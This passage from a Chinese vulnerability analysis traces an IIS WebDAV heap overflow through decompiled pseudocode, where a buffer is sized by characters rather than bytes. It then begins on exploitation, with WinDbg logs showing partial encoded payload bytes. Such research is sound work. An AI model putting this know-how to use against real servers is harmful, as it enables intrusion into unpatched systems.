        <span class="kt">wchar_t</span> <span class="o">*</span><span class="n">v17</span> <span class="o">=</span> <span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">mapinfo</span> <span class="o">-</span> <span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="mi">2</span><span class="o">*</span><span class="n">v16</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">v17</span> <span class="o">==</span> <span class="sc">&#39;\\&#39;</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="c1">// ......</span>
        <span class="p">}</span>
        <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">!*</span><span class="n">v17</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="c1">// ......</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="c1">// v7 = wcslen(/path&gt;)</span>
    <span class="kt">int</span> <span class="n">v18</span> <span class="o">=</span> <span class="n">v16</span> <span class="o">-</span> <span class="n">mapinfo</span><span class="p">.</span><span class="n">cchMatchingURL</span> <span class="o">+</span> <span class="n">v7</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">v19</span> <span class="o">=</span> <span class="o">*</span><span class="n">length</span> <span class="o">&lt;</span> <span class="n">v18</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">v19</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="o">*</span><span class="n">length</span> <span class="o">=</span> <span class="n">v18</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">a5</span><span class="p">)</span> 
        <span class="p">{</span>
            <span class="c1">// ......</span>
        <span class="p">}</span>
        <span class="n">result</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span> 
    <span class="p">{</span>
        <span class="kt">int</span> <span class="n">v24</span> <span class="o">=</span> <span class="p">(</span><span class="mi">2</span><span class="o">*</span><span class="n">mapinfo</span><span class="p">.</span><span class="n">cchMatchingPath</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">);</span>
        <span class="n">qmemcpy</span><span class="p">(</span>
            <span class="n">buffer1</span><span class="p">,</span> 
            <span class="n">mapinfo</span><span class="p">.</span><span class="n">lpszPath</span><span class="p">,</span> 
            <span class="mi">4</span> <span class="o">*</span> <span class="n">v24</span><span class="p">);</span>
        <span class="n">LOBYTE</span><span class="p">(</span><span class="n">v24</span><span class="p">)</span> <span class="o">=</span> <span class="mi">2</span><span class="o">*</span><span class="n">mapinfo</span><span class="p">.</span><span class="n">cchMatchingPath</span><span class="p">;</span>
        <span class="n">qmemcpy</span><span class="p">(</span>
            <span class="o">&amp;</span><span class="n">buffer1</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">v24</span><span class="p">],</span>
            <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">mapinfo</span><span class="p">.</span><span class="n">lpszPath</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">v24</span><span class="p">,</span>
            <span class="n">v24</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="p">);</span>
        <span class="n">qmemcpy</span><span class="p">(</span>
            <span class="o">&amp;</span><span class="n">buffer1</span><span class="p">[</span><span class="n">mapinfo</span><span class="p">.</span><span class="n">cchMatchingPath</span><span class="p">],</span>
            <span class="o">&amp;</span><span class="n">Str</span><span class="p">[</span><span class="n">mapinfo</span><span class="p">.</span><span class="n">cchMatchingURL</span><span class="p">],</span>
            <span class="mi">2</span> <span class="o">*</span> <span class="p">(</span><span class="n">v7</span> <span class="o">-</span> <span class="n">mapinfo</span><span class="p">.</span><span class="n">cchMatchingURL</span><span class="p">)</span> <span class="o">+</span> <span class="mi">2</span><span class="p">);</span>
        <span class="k">for</span> <span class="p">(</span><span class="kt">wchar_t</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">buffer1</span><span class="p">[</span><span class="n">mapinfo</span><span class="p">.</span><span class="n">cchMatchingPath</span><span class="p">];</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span> <span class="n">p</span> <span class="o">+=</span> <span class="mi">2</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">p</span> <span class="o">==</span> <span class="sc">&#39;/&#39;</span><span class="p">)</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="sc">&#39;\\&#39;</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="o">*</span><span class="n">length</span> <span class="o">=</span> <span class="n">mapinfo</span><span class="p">.</span><span class="n">cchMatchingPath</span> <span class="o">-</span> <span class="n">mapinfo</span><span class="p">.</span><span class="n">cchMatchingURL</span> <span class="o">+</span> <span class="n">v7</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
        <span class="n">result</span> <span class="o">=</span> <span class="n">v36</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>


<p>函数 <code>HrCheckIfHeader</code> 会调用 <code>ScStoragePathFromUrl</code> 两次，在第一次调用 <code>ScStoragePathFromUrl</code> 时，会执行如下的关键代码：</p>
<div class="codehilite"><pre><span></span><span class="p">{</span>
    <span class="kt">wchar_t</span> <span class="o">*</span><span class="n">Str</span> <span class="o">=</span> <span class="n">buffer2</span><span class="p">;</span>
    <span class="c1">// 返回 /path&gt;</span>
    <span class="kt">int</span> <span class="n">result</span> <span class="o">=</span> <span class="n">iecb</span><span class="o">-&gt;</span><span class="n">ScStripAndCheckHttpPrefix</span><span class="p">(</span><span class="o">&amp;</span><span class="n">Str</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">v7</span> <span class="o">=</span> <span class="n">wcslen</span><span class="p">(</span><span class="n">Str</span><span class="p">);</span>

    <span class="n">HSE_UNICODE_URL_MAPEX_INFO</span> <span class="n">mapinfo</span><span class="p">;</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">iecb</span><span class="o">-&gt;</span><span class="n">ScReqMapUrlToPathEx</span><span class="p">(</span><span class="n">Str</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">mapinfo</span><span class="p">);</span>

    <span class="c1">// 0x12   L&quot;c:\inetpub\wwwroot&quot;</span>
    <span class="kt">int</span> <span class="n">v16</span> <span class="o">=</span> <span class="n">mapinfo</span><span class="p">.</span><span class="n">cchMatchingPath</span><span class="p">;</span>

    <span class="c1">//  v18 = 0x12 - 0 + wcslen(&#39;/path&gt;&#39;) + 1 = 0x12 + 10249 + 1 = 0x281c</span>
    <span class="kt">int</span> <span class="n">v18</span> <span class="o">=</span> <span class="n">v16</span> <span class="o">-</span> <span class="n">mapinfo</span><span class="p">.</span><span class="n">cchMatchingURL</span> <span class="o">+</span> <span class="n">v7</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">v19</span> <span class="o">=</span> <span class="o">*</span><span class="n">length</span> <span class="o">&lt;</span> <span class="n">v18</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">v19</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="o">*</span><span class="n">length</span> <span class="o">=</span> <span class="n">v18</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">a5</span><span class="p">)</span> 
        <span class="p">{</span>
            <span class="c1">// ......</span>
        <span class="p">}</span>
        <span class="n">result</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>


<p>这里得到 <code>v18</code> 的值为 <code>0x281c</code>，而 <code>*length</code> 的值由参数传递，实际由 <code>CStackBuffer::resize</code> 计算得到，最终的值为 <code>0x82</code>，计算公式为：</p>
<div class="codehilite"><pre><span></span><span class="n">fake_heap_size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="n">size</span> <span class="o">=</span> <span class="mi">260</span><span class="p">;</span>
<span class="n">fake_heap_size</span> <span class="o">=</span> <span class="p">(</span><span class="mi">4</span> <span class="o">*</span> <span class="n">size</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">fake_heap_size</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="p">);</span>
<span class="n">fake_heap_size</span> <span class="o">|=</span> <span class="mi">2</span><span class="p">;</span>

<span class="n">length</span> <span class="o">=</span> <span class="n">fake_heap_size</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span><span class="p">;</span>
</pre></div>


<p>显然有 <code>0x82 &lt; 0x281c</code>，所以函数 <code>ScStoragePathFromUrl</code> 将 <code>*length</code> 填充为 <code>0x281c</code> 并返回 <code>1</code>。实际上，这个值代表的是真实物理路径的<strong>字符个数</strong>。</p>
<div class="codehilite"><pre><span></span><span class="mh">0x281c</span> <span class="o">=</span> <span class="mh">0x12</span> <span class="p">(</span><span class="s">&quot;c:\inetpub\wwwroot&quot;</span><span class="p">)</span> <span class="o">+</span> <span class="mi">10248</span> <span class="p">(</span><span class="s">&quot;/aaa..&quot;</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span> <span class="p">(</span><span class="sc">&#39;&gt;&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span> <span class="p">(</span><span class="sc">&#39;\0&#39;</span><span class="p">)</span>
</pre></div>


<p>在 <code>HrCheckIfHeader</code> 第二次调用 <code>ScStoragePathFromUrl</code> 之前，将根据 <code>length</code> 的值设置 <code>CStackBuffer</code> 缓冲区的大小。然而，这里设置的大小是字符个数，并不是字节数，所以第二次调用 <code>ScStoragePathFromUrl</code> 时会导致缓冲区溢出。实际上，调用 <code>CStackBuffer::resize</code> 的位置就是 <code>httpext!HrCheckIfHeader+0x0000013c</code>，也就是堆溢出发生时通过 <code>!heap -p -a edi</code> 命令得到的栈帧。</p>
<div class="codehilite"><pre><span></span><span class="n">res</span> <span class="o">=</span> <span class="n">pMethUtil</span><span class="o">-&gt;</span><span class="n">ScStoragePathFromUrl</span><span class="p">(</span>
    <span class="n">buffer2</span><span class="p">.</span><span class="n">get</span><span class="p">(),</span> <span class="n">buffer1</span><span class="p">.</span><span class="n">get</span><span class="p">(),</span> <span class="o">&amp;</span><span class="n">length</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="n">res</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">buffer1</span><span class="p">.</span><span class="n">resize</span><span class="p">(</span><span class="n">length</span><span class="p">))</span>    <span class="c1">// httpext!HrCheckIfHeader+0x0000013c</span>
    <span class="p">{</span>
        <span class="n">res</span> <span class="o">=</span> <span class="n">pMethUtil</span><span class="o">-&gt;</span><span class="n">ScStoragePathFromUrl</span><span class="p">(</span>
            <span class="n">buffer2</span><span class="p">.</span><span class="n">get</span><span class="p">(),</span> <span class="n">buffer1</span><span class="p">.</span><span class="n">get</span><span class="p">(),</span> <span class="o">&amp;</span><span class="n">length</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>


<p>小结：</p>
<ul>
<li>函数 <code>ScStoragePathFromUrl</code> 负责将 URL 请求中的文件路径转换为实际的物理路径，函数的名字也印证了这一猜想；</li>
<li>第一次调用此函数时，由于缓冲区大小不够，返回实际物理路径的字符个数；</li>
<li>第二次调用此函数之前先调整缓冲区的大小；</li>
<li>由于缓冲区的大小设置成了字符个数，而不是字节数，因此导致缓冲区溢出；</li>
<li>两次调用同一个 API 很符合微软的风格（第一次得到所需的空间大小，调整缓冲区大小后再次调用）；</li>
</ul>
<h2>3. 漏洞利用</h2>
<h3>3.1 URL 解码</h3>
<p>在函数 <code>HrCheckIfHeader</code> 中，首先调用 <code>CRequest::LpwszGetHeader</code> 来获取 <strong>HTTP</strong> 头中的特定字段的值，该函数简化后的伪代码如下所示：</p>
<div class="codehilite"><pre><span></span><span class="kt">int</span> <span class="n">CRequest</span><span class="o">::</span><span class="n">LpwszGetHeader</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">tag</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a3</span><span class="p">)</span>
<span class="p">{</span>
    <span class="c1">// 查找缓存</span>
    <span class="kt">int</span> <span class="n">res</span> <span class="o">=</span> <span class="n">CHeaderCache</span><span class="o">&lt;</span><span class="kt">unsigned</span> <span class="kt">short</span><span class="o">&gt;::</span><span class="n">LpszGetHeader</span><span class="p">(</span>
        <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">this</span> <span class="o">+</span> <span class="mi">56</span><span class="p">,</span> <span class="n">tag</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">res</span><span class="p">)</span> <span class="k">return</span> <span class="n">res</span><span class="p">;</span>

    <span class="c1">// 获取值</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">pszHeader</span> <span class="o">=</span> <span class="n">this</span><span class="o">-&gt;</span><span class="n">LpszGetHeader</span><span class="p">(</span><span class="n">tag</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">pszHeader</span><span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>

    <span class="kt">int</span> <span class="n">nHeaderChars</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">pszHeader</span><span class="p">);</span>
    <span class="n">CStackBuffer</span><span class="o">&lt;</span><span class="n">tagPROPVARIANT</span><span class="p">,</span> <span class="mi">64</span><span class="o">&gt;</span> <span class="n">stackbuffer</span><span class="p">(</span><span class="mi">64</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">stackbuffer</span><span class="p">.</span><span class="n">resize</span><span class="p">(</span><span class="mi">2</span> <span class="o">*</span> <span class="n">nHeaderChars</span> <span class="o">+</span> <span class="mi">2</span><span class="p">))</span>
    <span class="p">{</span>
        <span class="c1">// _CxxThrowException(...);</span>
    <span class="p">}</span>

    <span class="c1">// 调用 ScConvertToWide 进行转换</span>
    <span class="kt">int</span> <span class="n">v11</span> <span class="o">=</span> <span class="n">nHeaderChars</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
    <span class="kt">char</span><span class="o">*</span> <span class="n">language</span> <span class="o">=</span> <span class="n">this</span><span class="o">-&gt;</span><span class="n">LpszGetHeader</span><span class="p">(</span><span class="s">&quot;Accept-Language&quot;</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">v7</span> <span class="o">=</span> <span class="n">ScConvertToWide</span><span class="p">(</span><span class="n">pszHeader</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v11</span><span class="p">,</span> 
                             <span class="n">stackbuffer</span><span class="p">.</span><span class="n">get</span><span class="p">(),</span> <span class="n">language</span><span class="p">,</span> <span class="n">a3</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">v7</span> <span class="p">)</span> <span class="c1">// _CxxThrowException(...);</span>

    <span class="c1">// 设置缓存</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">CHeaderCache</span><span class="o">&lt;</span><span class="kt">unsigned</span> <span class="kt">short</span><span class="o">&gt;::</span><span class="n">SetHeader</span><span class="p">(</span>
            <span class="n">tag</span><span class="p">,</span> <span class="n">stackbuffer</span><span class="p">.</span><span class="n">get</span><span class="p">(),</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">stackbuffer</span><span class="p">.</span><span class="n">release</span><span class="p">();</span>

    <span class="k">return</span> <span class="n">res</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>


<p>可以看出这里通过 <code>CHeaderCache</code> 建立缓存机制，此外获取到的值会通过调用 <code>ScConvertToWide</code> 来进行转换操作。事实上，<code>ScConvertToWide</code> 会调用 <code>MultiByteToWideChar</code> 对字符串进行转换。</p>
<div class="codehilite"><pre><span></span><span class="n">MultiByteToWideChar</span><span class="p">(</span>
    <span class="n">CP_UTF8</span><span class="p">,</span> 
    <span class="mi">0</span><span class="p">,</span> 
    <span class="n">pszHeader</span><span class="p">,</span> 
    <span class="n">strlen</span><span class="p">(</span><span class="n">pszHeader</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> 
    <span class="n">lpWideCharStr</span><span class="p">,</span> 
    <span class="n">strlen</span><span class="p">(</span><span class="n">pszHeader</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
</pre></div>


<p>由于存在编码转换操作，Exploit 中的 Payload 需要先进行编码，这样才能保证解码后得到正常的 Payload。字符串转换的调试日志如下所示：</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">007</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">00000655</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">077</span><span class="n">f59a9</span> <span class="n">edx</span><span class="o">=</span><span class="mi">077</span><span class="n">f5900</span> <span class="n">esi</span><span class="o">=</span><span class="mi">0000</span><span class="n">fde9</span> <span class="n">edi</span><span class="o">=</span><span class="mi">77</span><span class="n">e62fd6</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">6712721</span><span class="n">f</span> <span class="n">esp</span><span class="o">=</span><span class="mi">03</span><span class="n">fef5b0</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">03</span><span class="n">fef71c</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>
<span class="n">httpext</span><span class="o">!</span><span class="n">ScConvertToWide</span><span class="o">+</span><span class="mh">0x150</span><span class="o">:</span>
<span class="mi">6712721</span><span class="n">f</span> <span class="n">ffd7</span>            <span class="n">call</span>    <span class="n">edi</span> <span class="o">{</span><span class="n">kernel32</span><span class="o">!</span><span class="n">MultiByteToWideChar</span> <span class="o">(</span><span class="mi">77</span><span class="n">e62fd6</span><span class="o">)}</span>

<span class="n">$$</span> <span class="err">调用</span> <span class="n">MultiByteToWideChar</span> <span class="err">时的参数</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">007</span><span class="o">&gt;</span> <span class="n">dds</span> <span class="n">esp</span> <span class="n">L6</span>
<span class="mi">03</span><span class="n">fef5b0</span>  <span class="mi">0000</span><span class="n">fde9</span>       <span class="n">$$</span> <span class="n">CP_UTF8</span>
<span class="mi">03</span><span class="n">fef5b4</span>  <span class="mi">00000000</span>       <span class="n">$$</span> <span class="mi">0</span>
<span class="mi">03</span><span class="n">fef5b8</span>  <span class="mi">077</span><span class="n">f59a8</span>       <span class="n">$$</span> <span class="n">pszHeader</span>
<span class="mi">03</span><span class="n">fef5bc</span>  <span class="mi">00000655</span>       <span class="n">$$</span> <span class="n">strlen</span><span class="o">(</span><span class="n">pszHeader</span><span class="o">)</span> <span class="o">+</span> <span class="mi">1</span>
<span class="mi">03</span><span class="n">fef5c0</span>  <span class="mi">077</span><span class="n">f3350</span>       <span class="n">$$</span> <span class="n">lpWideCharStr</span>
<span class="mi">03</span><span class="n">fef5c4</span>  <span class="mi">00000655</span>       <span class="n">$$</span> <span class="n">strlen</span><span class="o">(</span><span class="n">pszHeader</span><span class="o">)</span> <span class="o">+</span> <span class="mi">1</span>

<span class="n">$$</span> <span class="err">转换前的字符串</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">007</span><span class="o">&gt;</span> <span class="n">db</span> <span class="mi">077</span><span class="n">f59a8</span>
<span class="mi">077</span><span class="n">f59a8</span>  <span class="mi">3</span><span class="n">c</span> <span class="mi">68</span> <span class="mi">74</span> <span class="mi">74</span> <span class="mi">70</span> <span class="mi">3</span><span class="n">a</span> <span class="mi">2</span><span class="n">f</span> <span class="mi">2</span><span class="n">f</span><span class="o">-</span><span class="mi">6</span><span class="n">c</span> <span class="mi">6</span><span class="n">f</span> <span class="mi">63</span> <span class="mi">61</span> <span class="mi">6</span><span class="n">c</span> <span class="mi">68</span> <span class="mi">6</span><span class="n">f</span> <span class="mi">73</span>  <span class="o">&lt;</span><span class="n">http</span><span class="o">://</span><span class="n">localhos</span>
<span class="mi">077</span><span class="n">f59b8</span>  <span class="mi">74</span> <span class="mi">2</span><span class="n">f</span> <span class="mi">61</span> <span class="mi">61</span> <span class="mi">61</span> <span class="mi">61</span> <span class="mi">61</span> <span class="mi">61</span><span class="o">-</span><span class="mi">61</span> <span class="n">e6</span> <span class="n">bd</span> <span class="n">a8</span> <span class="n">e7</span> <span class="n">a1</span> <span class="n">a3</span> <span class="n">e7</span>  <span class="n">t</span><span class="o">/</span><span class="n">aaaaaaa</span><span class="o">.......</span>
<span class="mi">077</span><span class="n">f59c8</span>  <span class="mi">9</span><span class="n">d</span> <span class="n">a1</span> <span class="n">e7</span> <span class="mi">84</span> <span class="n">b3</span> <span class="n">e6</span> <span class="n">a4</span> <span class="n">b6</span><span class="o">-</span><span class="n">e4</span> <span class="mi">9</span><span class="n">d</span> <span class="n">b2</span> <span class="n">e7</span> <span class="n">a8</span> <span class="n">b9</span> <span class="n">e4</span> <span class="n">ad</span>  <span class="o">................</span>
<span class="mi">077</span><span class="n">f59d8</span>  <span class="n">b7</span> <span class="n">e4</span> <span class="n">bd</span> <span class="n">b0</span> <span class="n">e7</span> <span class="mi">95</span> <span class="mi">93</span> <span class="n">e7</span><span class="o">-</span><span class="n">a9</span> <span class="mi">8</span><span class="n">f</span> <span class="n">e4</span> <span class="n">a1</span> <span class="n">a8</span> <span class="n">e5</span> <span class="mi">99</span> <span class="n">a3</span>  <span class="o">................</span>
<span class="mi">077</span><span class="n">f59e8</span>  <span class="n">e6</span> <span class="n">b5</span> <span class="mi">94</span> <span class="n">e6</span> <span class="n">a1</span> <span class="mi">85</span> <span class="n">e3</span> <span class="n">a5</span><span class="o">-</span><span class="mi">93</span> <span class="n">e5</span> <span class="mi">81</span> <span class="n">ac</span> <span class="n">e5</span> <span class="mi">95</span> <span class="n">a7</span> <span class="n">e6</span>  <span class="o">................</span>
<span class="mi">077</span><span class="n">f59f8</span>  <span class="mi">9</span><span class="n">d</span> <span class="n">a3</span> <span class="n">e3</span> <span class="mi">8</span><span class="n">d</span> <span class="n">a4</span> <span class="n">e4</span> <span class="mi">98</span> <span class="n">b0</span><span class="o">-</span><span class="n">e7</span> <span class="n">a1</span> <span class="mi">85</span> <span class="n">e6</span> <span class="n">a5</span> <span class="mi">92</span> <span class="n">e5</span> <span class="mi">90</span>  <span class="o">................</span>
<span class="mi">077</span><span class="n">f5a08</span>  <span class="n">b1</span> <span class="n">e4</span> <span class="n">b1</span> <span class="mi">98</span> <span class="n">e6</span> <span class="n">a9</span> <span class="mi">91</span> <span class="n">e7</span><span class="o">-</span><span class="mi">89</span> <span class="mi">81</span> <span class="n">e4</span> <span class="mi">88</span> <span class="n">b1</span> <span class="n">e7</span> <span class="mi">80</span> <span class="n">b5</span>  <span class="o">................</span>
<span class="mi">077</span><span class="n">f5a18</span>  <span class="n">e5</span> <span class="n">a1</span> <span class="mi">90</span> <span class="n">e3</span> <span class="mi">99</span> <span class="n">a4</span> <span class="n">e6</span> <span class="n">b1</span><span class="o">-</span><span class="mi">87</span> <span class="n">e3</span> <span class="mi">94</span> <span class="n">b9</span> <span class="n">e5</span> <span class="mi">91</span> <span class="n">aa</span> <span class="n">e5</span>  <span class="o">................</span>

<span class="mi">0</span><span class="o">:</span><span class="mi">007</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">000003</span><span class="n">d1</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">00000655</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">0000</span><span class="n">b643</span> <span class="n">edx</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">esi</span><span class="o">=</span><span class="mi">0000</span><span class="n">fde9</span> <span class="n">edi</span><span class="o">=</span><span class="mi">77</span><span class="n">e62fd6</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">67127221</span> <span class="n">esp</span><span class="o">=</span><span class="mi">03</span><span class="n">fef5c8</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">03</span><span class="n">fef71c</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>
<span class="n">httpext</span><span class="o">!</span><span class="n">ScConvertToWide</span><span class="o">+</span><span class="mh">0x152</span><span class="o">:</span>
<span class="mi">67127221</span> <span class="mi">85</span><span class="n">c0</span>            <span class="n">test</span>    <span class="n">eax</span><span class="o">,</span><span class="n">eax</span>

<span class="n">$$</span> <span class="err">转换后的字符串</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">007</span><span class="o">&gt;</span> <span class="n">db</span> <span class="mi">077</span><span class="n">f3350</span>
<span class="mi">077</span><span class="n">f3350</span>  <span class="mi">3</span><span class="n">c</span> <span class="mi">00</span> <span class="mi">68</span> <span class="mi">00</span> <span class="mi">74</span> <span class="mi">00</span> <span class="mi">74</span> <span class="mi">00</span><span class="o">-</span><span class="mi">70</span> <span class="mi">00</span> <span class="mi">3</span><span class="n">a</span> <span class="mi">00</span> <span class="mi">2</span><span class="n">f</span> <span class="mi">00</span> <span class="mi">2</span><span class="n">f</span> <span class="mi">00</span>  <span class="o">&lt;.</span><span class="n">h</span><span class="o">.</span><span class="na">t</span><span class="o">.</span><span class="na">t</span><span class="o">.</span><span class="na">p</span><span class="o">.:././.</span>
<span class="mi">077</span><span class="n">f3360</span>  <span class="mi">6</span><span class="n">c</span> <span class="mi">00</span> <span class="mi">6</span><span class="n">f</span> <span class="mi">00</span> <span class="mi">63</span> <span class="mi">00</span> <span class="mi">61</span> <span class="mi">00</span><span class="o">-</span><span class="mi">6</span><span class="n">c</span> <span class="mi">00</span> <span class="mi">68</span> <span class="mi">00</span> <span class="mi">6</span><span class="n">f</span> <span class="mi">00</span> <span class="mi">73</span> <span class="mi">00</span>  <span class="n">l</span><span class="o">.</span><span class="na">o</span><span class="o">.</span><span class="na">c</span><span class="o">.</span><span class="na">a</span><span class="o">.</span><span class="na">l</span><span class="o">.</span><span class="na">h</span><span class="o">.</span><span class="na">o</span><span class="o">.</span><span class="na">s</span><span class="o">.</span>
<span class="mi">077</span><span class="n">f3370</span>  <span class="mi">74</span> <span class="mi">00</span> <span class="mi">2</span><span class="n">f</span> <span class="mi">00</span> <span class="mi">61</span> <span class="mi">00</span> <span class="mi">61</span> <span class="mi">00</span><span class="o">-</span><span class="mi">61</span> <span class="mi">00</span> <span class="mi">61</span> <span class="mi">00</span> <span class="mi">61</span> <span class="mi">00</span> <span class="mi">61</span> <span class="mi">00</span>  <span class="n">t</span><span class="o">./.</span><span class="n">a</span><span class="o">.</span><span class="na">a</span><span class="o">.</span><span class="na">a</span><span class="o">.</span><span class="na">a</span><span class="o">.</span><span class="na">a</span><span class="o">.</span><span class="na">a</span><span class="o">.</span>
<span class="mi">077</span><span class="n">f3380</span>  <span class="mi">61</span> <span class="mi">00</span> <span class="mi">68</span> <span class="mi">6</span><span class="n">f</span> <span class="mi">63</span> <span class="mi">78</span> <span class="mi">61</span> <span class="mi">77</span><span class="o">-</span><span class="mi">33</span> <span class="mi">71</span> <span class="mi">36</span> <span class="mi">69</span> <span class="mi">72</span> <span class="mi">47</span> <span class="mi">39</span> <span class="mi">7</span><span class="n">a</span>  <span class="n">a</span><span class="o">.</span><span class="na">hocxaw3q6irG9z</span>
<span class="mi">077</span><span class="n">f3390</span>  <span class="mi">77</span> <span class="mi">4</span><span class="n">b</span> <span class="mi">70</span> <span class="mi">4</span><span class="n">f</span> <span class="mi">53</span> <span class="mi">75</span> <span class="mi">4</span><span class="n">f</span> <span class="mi">7</span><span class="n">a</span><span class="o">-</span><span class="mi">68</span> <span class="mi">48</span> <span class="mi">63</span> <span class="mi">56</span> <span class="mi">54</span> <span class="mi">6</span><span class="n">d</span> <span class="mi">45</span> <span class="mi">68</span>  <span class="n">wKpOSuOzhHcVTmEh</span>
